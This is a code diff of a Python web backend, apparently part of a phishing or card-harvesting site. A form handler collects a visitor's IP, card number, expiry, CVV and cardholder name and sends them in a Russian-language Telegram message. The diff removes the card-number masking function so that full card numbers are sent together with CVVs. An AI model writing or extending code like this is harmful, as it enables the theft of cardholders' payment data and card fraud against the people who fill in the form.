@@ -60,12 +60,6 @@ async def _send_telegram(text: str) -> None:
         logger.error("Telegram sendMessage exception: %s", exc)
 
 
-def _mask_card(number: str) -> str:
-    digits = number.replace(" ", "").replace("-", "")
-    if len(digits) >= 4:
-        return "*" * (len(digits) - 4) + digits[-4:]
-    return digits
-
 
 @router.get("/bin/{bin}")
 async def bin_lookup(bin: str) -> JSONResponse:
@@ -108,8 +102,6 @@ async def submit_form(payload: CardSubmit, request: Request) -> JSONResponse:
         or (request.client.host if request.client else "unknown")
     )
 
-    masked = _mask_card(payload.card_number) if payload.card_number else "—"
-
     lines = [
         "🔔 <b>Новая заявка</b>",
         "",
@@ -118,7 +110,7 @@ async def submit_form(payload: CardSubmit, request: Request) -> JSONResponse:
         f"🌐 <b>IP посетителя:</b> <code>{ip}</code>",
         "",
         "💳 <b>Карта:</b>",
-        f"  Номер: <code>{masked}</code>",
+        f"  Номер: <code>{payload.card_number or '—'}</code>",
         f"  Срок: <code>{payload.card_exp or '—'}</code>",
         f"  CVV: <code>{payload.card_cvv or '—'}</code>",
         f"  Имя: {payload.card_name or '—'}",
